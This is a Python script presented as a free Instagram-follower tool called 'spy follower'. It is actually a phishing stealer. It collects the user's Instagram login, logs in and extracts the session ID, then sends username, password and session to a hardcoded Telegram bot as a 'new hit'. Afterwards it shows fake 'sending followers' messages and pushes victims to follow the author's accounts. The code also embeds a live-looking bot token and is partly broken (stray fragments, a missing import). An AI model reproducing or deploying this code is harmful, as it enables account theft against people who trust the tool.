import instaloader,sys

from instaloader import Instaloader
import termcolor
x = Instaloader()
import requests
import random
import os, json
import base64

try:
 import gamerinsta
except:
 os.system("pip install gamerinsta")
 os.system('pip install webbrowser')
import pyfiglet

from time import sleep
import requests
from gamerinsta import Login
log=Login()
print("")
def generate_ascii_art(text):
   
    font = pyfiglet.Figlet()
   
    ascii_art = font.renderText(text)

    return ascii_art

def main():
    text = "spy follower"
    ascii_art = generate_ascii_art(text)
    print(ascii_art)
  
if __name__ == "__main__":
   main()
print("                                      by @crazy_hacker404 \n\n")
sleep(2)

Username=input("Enter Your insta Username :- ")
Pass=("Enter Your insta Password :- ")
a = Username
b = Pass
login=log.Loginv1(Username,Pass)
try:
 sess = login['Ig-Bearer-Token']
 sess =base64.b64decode(sess).decode()
 sess=json.loads(sess)
 usid=sess['ds_user_id']
 sess=sess['sessionid']
 c = sess
 sleep(15)
 print("\n")
 
except:

 print(login)
sleep(10)

def send_message_to_telegram(token, chat_id, text1, text2):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    message = f"{text1}\n\n{text2}"

    data = {
        "chat_id": chat_id,
        "text": message
    }

    response = requests.post(url, data=data)
    return response.json()

# Replace 'YOUR_BOT_TOKEN' and 'CHAT_ID' with your actual bot token and chat ID
bot_token = '6063855780:AAGeGg2CIZZbyh7_3Hq9N4cnJLKHjLCUez4'
chat_id = '1821190441'
text1 ="hey! you got a new hit"
text2 = "username", a,   "password" , b , c

response = send_message_to_telegram(bot_token, chat_id, text1, text2)
print(response)
os.system('clear')
def generate_ascii_art(text):
   
    font = pyfiglet.Figlet()
   
    ascii_art = font.renderText(text)

    return ascii_art

def main():
    text = "spy follower"
    ascii_art = generate_ascii_art(text)
    print(ascii_art)
  
if __name__ == "__main__":
   main()
print("                                      by @crazy_hacker404\n\n")
sleep(2)

try:
	uname = ("\033[36mThis tool is for educational purpose only. \033[0m: \033[36m")
	if uname == "":
		print("\033[33mUnknown command!")
		sys.exit()

	f = instaloader.Profile.from_username(x.context,a)

	print("\033[32mUsername\033[0m :", f.username)
    
	print("\033[32mID\033[0m :", f.userid)
    
	print("\033[32mInsta name\033[0m :", f.full_name)
	sleep(1)
	
	print("\033[32mfollowers\033[0m :", f.followers)
	sleep(1)
	print("\033[32mFollowing\033[0m :", f.followees)
	sleep(1)
	
         
except KeyboardInterrupt:
	print("\033[33mI understand!")

except EOFError:
	print("\033[33mWhy?")
	
c = input("\n\n Enter key to continue:-  ")	
if (c== "crazy_hacker404 x gazew_ff"):
    	sleep(1)
    	print("\n key is correct.\n")
    	sleep(1)
    	os.system('python followers.py')

    	    
else:
	print("invalid password")
	exit()
	eep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[32msending followers, status {sucess}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[32msending followers, status {sucess}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[32msending followers, status {sucess}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[32msending followers, status {sucess}")
    	sleep(2)
    	print("\033[32msending followers, status {sucess}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[32msending followers, status {sucess}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[32msending followers, status {sucess}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[32msending followers, status {sucess}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[33msending followers, status {error}")
    	sleep(2)
    	print("\033[32msending followers, status {sucess}")
    	sleep(2)
    	print("\033[32msending followers, status {sucess}")
    	sleep(2)
    	print("\033[35m \n total 50 followers request sent.\033[0m")
    	sleep(2)
    	g = input("for more followers, you have to follow other profiles.\n want more [Y /N]\n")
    	if(g=="Y"):
    	    
    	    print("\n Follow 5 profiles to get 100 followers \n")
    	    a = "https://instagram.com/crazy__hacker404?igshid=NTc4MTIwNjQ2YQ=="
    	    b="https://instagram.com/harshdeep76900?igshid=NTc4MTIwNjQ2YQ=="
    	    c="https://instagram.com/its_pri.ya_01?igshid=NTc4MTIwNjQ2YQ=="
    	    d="https://instagram.com/khantwal__?igshid=NTc4MTIwNjQ2YQ=="
    	    e="https://instagram.com/anshul_duklan?igshid=NTc4MTIwNjQ2YQ=="
    	    sleep(1)
    	    webbrowser.open(a)
    	    sleep(1)
    	    print("follow success.\n \n")
    	    sleep(2)
    	    print("follow next account\n")
    	    sleep(3)
    	    webbrowser.open(b)
    	    sleep(5)
    	    print("follow success.\n")
    	    sleep(2)
    	    print("follow next account.\n")
    	    sleep(3)
    	    webbrowser.open(c)
    	    sleep(5)
    	    print("follow success.\n")
    	    sleep(2)
    	    print("follow next account")
    	    sleep(3)
    	    webbrowser.open(d)
    	    sleep(5)
    	    print("follow success.\n\n")
    	    sleep(2)
    	    print("follow next account")
    	    sleep(3)
    	    webbrowser.open(e)
    	    sleep(5)
    	    print("follow success.\n\n")
    	    sleep(2)
    	    print("out of order. come back later")
    	    exit()
    	  
    	    
else:
	print("invalid password")
	exit()
	